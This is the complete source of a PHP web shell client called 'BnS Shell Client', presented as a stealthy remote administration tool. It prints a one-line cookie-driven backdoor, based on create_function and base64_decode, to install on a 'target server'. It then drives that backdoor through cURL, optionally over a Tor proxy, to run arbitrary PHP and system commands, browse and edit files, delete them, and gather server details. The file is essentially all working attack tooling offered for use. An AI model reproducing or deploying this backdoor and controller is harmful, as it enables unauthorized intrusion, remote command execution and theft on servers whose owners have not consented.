<?php
/*
 *  Basic and Stealthy PHP remote administration tool
 *  version 1.0 beta
 *  Uses cookies to communicate with remote server
 *  Requires: php5-curl and modern web browser with JavaScript support
 */

/*
 *  Settings (defaults are fine)
 */
/*
 *  Uncomment this to send useragent header
 */
//$useragent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";
/*
 *   Socks4 proxy config
 *   REMEMBER! cURL in PHP leaks DNS requests through socks!
 *   https://www.dnsleaktest.com/
 */
//$proxy = "socks5://127.0.0.1:9050";
//$proxy_auth ="user:password";

/*
 *  Commands and expected result to check if shell is installed and working correctly
 */
$check_commands = "echo 1;";
$expected_result = "1";

//Do not edit after this line
if (!extension_loaded('curl')) die("cURL extension is missing! Install php5-curl.");
if (isset($_POST["exec"])) {
    $c = curl_init();
    curl_setopt_array($c, array(
        CURLOPT_URL => $_POST["shell_url"],
        CURLOPT_COOKIE => "z=".$_POST["commands"]
    ));

    if (isset($proxy)) {
        curl_setopt_array($c, array(CURLOPT_PROXY => $proxy, CURLOPT_HTTPPROXYTUNNEL => true));
        if (isset($proxy_auth)) curl_setopt($c, CURLOPT_PROXYUSERPWD, $proxy["auth"]);
    }
    if (isset($useragent)) curl_setopt($c, CURLOPT_USERAGENT, $useragent); 

    if (curl_exec($c) === false) {
        http_response_code(500);
        echo curl_error($c);
    } else if (curl_getinfo($c, CURLINFO_HTTP_CODE) !== 200) {
        http_response_code(curl_getinfo($c, CURLINFO_HTTP_CODE));
    }  
    
    curl_close($c);
    die();
}

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>:: BnS Shell Client ::</title>


        <style>
            input, textarea { display: block; }
            input, textarea {font-family: monospace; background: #1B1B1B; color: #3C9C9C; border: 1px black solid;}
            input {width: 500px;}
            input.active {color: #008000;}
            textarea { width: 100%; }
            body {text-align: center; font-family: sans-serif; background: #000; color: #3C9C9C;}
            pre { border: 2px #000 solid; font-weight: bold; background: #4C4C4C;}
            button {cursor:pointer; margin: 0px; padding: 0px; border: none; background: #4C4C4C; color: #000000;}
            button.active { background: #CCC; }
            button:hover { background: #CCC; }
            table {text-align: left; }
            .container { width: 800px; margin: 0px auto;}
            .hidden {display: none;}
            .inline {display: inline-block;}
            .info {position: absolute; top: 0px; right: 0px; font-size: 9px; text-align: right; color: #D3D3D3} 
            .fm-dir { font-weight: bold; color: red; cursor: pointer;}
            .fm-dir:hover, .fm-file:hover { font-weight: bold; color: inherit;}
            .fm-file { color: green; cursor: pointer;}
            #output { height: 300px; }
            #shell-input { width: 80%; display: inline-block;}
            #shell-url { width: 80%; display: inline-block;}
        </style>
    </head>

    <body>
        <noscript><h1>THIS PAGE REQUIRES JAVASCRIPT!</h2></noscript>
        <div class="info">
            <div>Your IP: <?php echo $_SERVER["REMOTE_ADDR"]; ?></div>
            <div>User-Agent: <?php echo $_SERVER["HTTP_USER_AGENT"]; ?></div>
        </div>
        <div class="container">
            <div class="header">
                <h1>~ BnS shell client ~</h1>
                <p>Use the following code to install BnS shell on a target server:</p>
                <pre>&lt;?php $f=create_function(&quot;&quot;,base64_decode(@$_COOKIE[&quot;z&quot;]));@$f(); ?&gt;</pre>
            </div>
            <hr>
            <input type="text" id="shell-url" placeholder="Shell URL" required>
            <button id="check-shell-btn">Check</button>
            <hr>
            <button id="php-console-btn">PHP console</button>
            <button id="system-shell-btn">System shell</button>
            <button id="fm-btn">File manager</button>

            <div class="hidden" id="file-manager">
                <hr>
                <form id="fm">
                    <input type="text" id="fm-path" autocomplete="off" style="width: 80%; display: inline-block;">
                    <button>Go</button>
                </form>
                <hr>
                <table>
                    <tr>
                        <th>name</th>
                        <th>type</th>
                        <th>size</th>
                        <th>modified</th>
                        <th>perms</th>
                        <th>action</th>
                    </tr>
                    <tbody id="file-list">
                        <tr><td colspan="0"><h2>Enter location and press Go</h2></td></tr>
                    </tbody>
                </table>

                <div>
                    <hr>
                    <button id="fm-file-create">Create file</button>
                </div>
            </div>

            <form  class="hidden" id="php-console">
                <textarea id="commands" placeholder="PHP code to execute" required></textarea>
                <button>Submit</button>
            </form>
            <hr>
            <button id="info-btn" >Server info</button>
            <hr>
            <textarea id="output"></textarea>
            <div class="hidden" id="fm-buttons">
                <button id="fm-file-save">Save</button>
                <button id="fm-file-cancel">Cancel</button>
            </div>
            <form  class="hidden" id="shell-console">
                $ <input type="text" id="shell-input" autocomplete="off" required >
                <button>Submit</button>
            </form>
        </div>

        <script type="text/javascript">
            var fm_CWD;
            var fm_output=[];

            function $id(id){ return document.getElementById(id); }
            function cleanCommands(code) { return code.replace(/\ {2,}/g, ' ').replace(/\n/g, '')+"die();"; }
            function printOutput(text) { $id("output").value = text; }
            function clearOutput(){ $id("output").value=""; }
            function toggle(id){ el = $id(id); el.classList.toggle("hidden"); }
            function active(el){ el.classList.toggle("active"); }

            function getCWD() {
                if (!fm_CWD) {
                    var commands = "echo getcwd();";
                    exec(commands, function(r){
                        window.fm_CWD = r;
                        $id("fm-path").value = r;
                    });
                }
            }

            function fileSizeSI(a,b,c,d,e){
                return (b=Math,c=b.log,d=1e3,e=c(a)/c(d)|0,a/b.pow(d,e)).toFixed(2)
                +' '+(e?'kMGTPEZY'[--e]+'B':'Bytes')
            }

            function base64_encode(m){for(var k="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".split(""),c,d,h,e,a,g="",b=0,f,l=0;l<m.length;++l){c=m.charCodeAt(l);if(128>c)d=1;else for(d=2;c>=2<<5*d;)++d;for(h=0;h<d;++h)1==d?e=c:(e=h?128:192,a=d-2-6*h,0<=a&&(e+=(6<=a?1:0)+(5<=a?2:0)+(4<=a?4:0)+(3<=a?8:0)+(2<=a?16:0)+(1<=a?32:0),a-=5),0>a&&(u=6*(d-1-h),e+=c>>u,c-=c>>u<<u)),f=b?f<<6-b:0,b+=2,f+=e>>b,g+=k[f],f=e%(1<<b),6==b&&(b=0,g+=k[f])}b&&(g+=k[f<<6-b]);return g}

            function printInfo(info) {
                var text = "uname: "+info[0]+"\n"+
                    "Server software: "+info[1]+"\n"+
                    "Server IP: "+info[2]+"\n"+
                    "PHP version: "+info[3]+"\n"+
                    "Datetime: "+info[4]+"\n"+
                    "Working directory: "+info[5]+"\n"+
                    "Your IP (as seen on remote server): "+info[6]+"\n"+
                    "========\n\n"+
                    "Disabled PHP functions: "+info[7]+"\n"+
                    "========\n\n"+
                    "Loaded extensions: "+info[8]+"\n"+
                    "";
                    
                $id("output").value = text;
            }


            function exec(commands, callback){
                var shell_url = $id("shell-url").value; 
                if (shell_url == ""){ $id("output").value = "Error: You did not specified shell URL"; return;} 
                var post_data = "exec=1&shell_url="+shell_url+"&commands="+encodeURIComponent(base64_encode(cleanCommands(commands)));
                var xhr = new XMLHttpRequest();

                xhr.open('POST', '', true);
                xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                xhr.setRequestHeader("Content-length", post_data.length);
                xhr.setRequestHeader("Connection", "close");
                xhr.onreadystatechange = function(){
                    if (xhr.readyState != 4) return;
                    if (xhr.status == 200) {
                        if (xhr.responseText == "") {printOutput("Remote server returned nothing. This can be an error."); return;}
                        callback(xhr.responseText);
                    } else {
                        printOutput(xhr.status+" Error\n"+xhr.responseText); return;
                    };
                }
                xhr.send(post_data);
            }        

            function execPHP() {
                exec($id("commands").value, function(r) {
                    printOutput(r);
                });
            }

            function execShell() {
                var commands = "echo shell_exec('" +$id('shell-input').value +"');";
                exec(commands, function(r) {
                    printOutput(r); $id("output").scrollTop = 99999;
                });
            }

            function scanDir(){
                fm_output=[];
                $id('file-list').innerHTML = "";

                var dir = $id("fm-path").value; fm_CWD = dir;

                var commands="$dir='"+dir+"';\
                    $items=scandir($dir);\
                    foreach($items as $item){\
                        $fitem = '"+dir+"/'.$item;\
                        $p=stat($fitem);\
                        if (is_dir($fitem)) {\
                            echo $item . ':d::'.$p[9].':'.fileperms($fitem).'|';\
                        } else if (is_file($fitem)){\
                            echo $item . ':f:'.$p[7].':'.$p[9].':'.fileperms($fitem).'|';\
                        } else {\
                            echo $item . ':u:::|';\
                        }\
                    }";
                exec(commands, function(r){
                    formatFMOutput(r);
                });
                
            }

            function fmOpenDir(dir){
                $id("fm-path").value = dir; scanDir();
            }

            function fmOpenFile(file){
                var commands = "echo file_get_contents('"+file+"');";
                exec(commands, function(r){
                    printOutput(r);
                });

            }

            function formatFMOutput(str){
                var items = str.split("|");
                items.forEach(function(v,k){
                    if (v=='') return;
                    fm_output.push(v.split(":"));
                });

                fm_output.forEach(function(v,k){
                    var full_name = fm_CWD + "/"+v[0];

                    if (v[1] == "d") {
                        var cl='fm-dir';
                        var fm_actions = "<button class='fm-dir-del'>del</button>";
                    } else {
                        var cl='fm-file';
                        var fm_actions = "<button class='fm-file-del'>del</button>\
                        <button class='fm-file-edit'>edit</button>";
                    } 

                    $id("file-list").innerHTML = $id("file-list").innerHTML + "<tr data-name='"+full_name+"'>\
                    <td><span class='"+cl+"'>"+v[0]+"</span></td>\
                    <td>"+v[1]+"</td>\
                    <td>"+fileSizeSI(v[2])+"</td>\
                    <td>"+v[3]+"</td>\
                    <td>"+v[4]+"</td>\
                    <td>"+fm_actions+"</td>\
                    </tr>";
                });
            }

            function getInfo() {
                var commands = 'echo join(",", array(\
                    php_uname(),\
                    $_SERVER["SERVER_SOFTWARE"],\
                    $_SERVER["SERVER_ADDR"],\
                    phpversion(),\
                    date("c",time()),\
                    getcwd(),\
                    $_SERVER["REMOTE_ADDR"],\
                    str_replace(",", " ", ini_get("disable_functions")),\
                    join(" ",get_loaded_extensions()),\
                ));';
                exec(commands, function(r) {
                    printInfo(r.split(","));
                });

            }

            function fmFileSave(file_name, file_content){
                var commands = 'echo file_put_contents("'+file_name+'", base64_decode("'+base64_encode(file_content)+'"));';
                exec(commands, function(r){ 
                    alert("File saved"); 
                    toggle("fm-buttons");
                    scanDir();
                    return false;
                }); 
            }

            function fmFileCreate() {
                var file_name = prompt("File name", "");
                window.editing_file = fm_CWD + "/" + file_name;
                printOutput("");  $id("output").focus();
                toggle("fm-buttons");
            }

            function fmFileDel(file_name) {
                var commands = 'echo unlink("'+file_name+'");';
                exec(commands, function(r) {
                    alert("File deleted");
                    scanDir();
                    return false;
                });
            }

            window.onload = function(){
                $id("php-console-btn").onclick = function() { toggle('php-console'); active(this); }
                $id("system-shell-btn").onclick = function() { toggle('shell-console'); active(this); }
                $id("fm-btn").onclick = function() { toggle('file-manager'); active(this); getCWD(); }
                $id("info-btn").onclick = function() { getInfo(); }
                $id("check-shell-btn").onclick = function() { checkShell(); }
                $id("fm-file-save").onclick = function() { fmFileSave(window.editing_file, $id("output").value); }
                $id("fm-file-cancel").onclick = function() { printOutput("Canceled"); toggle("fm-buttons"); }
                $id("fm-file-create").onclick = function() { fmFileCreate(); }

                $id("fm").onsubmit = function(){ scanDir(); return false;}
                $id("php-console").onsubmit = function(){ execPHP(); return false;}
                $id("shell-console").onsubmit = function(){ execShell(); return false;}

                document.body.addEventListener('click',classHandler,false);
                function classHandler(e){
                    e = e || window.event; var target = e.target || e.srcElement;
                    if (target.className == "fm-dir") {
                        fmOpenDir(target.parentNode.parentNode.getAttribute('data-name'));
                    } else if (target.className == "fm-file") {
                        fmOpenFile(target.parentNode.parentNode.getAttribute('data-name'));
                    } else if (target.className == "fm-file-edit") {
                        window.editing_file = target.parentNode.parentNode.getAttribute('data-name');
                        fmOpenFile(editing_file); $id("output").focus(); toggle("fm-buttons");
                    } else if (target.className == "fm-file-del") {
                        fmFileDel(target.parentNode.parentNode.getAttribute('data-name'));
                    }
                }
            }

            function checkShell() {
                var commands = '<?php echo $check_commands; ?>';
                exec(commands, function(r){
                    if (r == '<?php echo $expected_result; ?>') {
                        printOutput("Shell is active!"); $id("shell-url").className = "active";
                    } else {
                        printOutput("Shell is not installed or something went wrong!"); $id("shell-url").className = "";
                    }
                });

            }
        </script>
    </body>
</html>
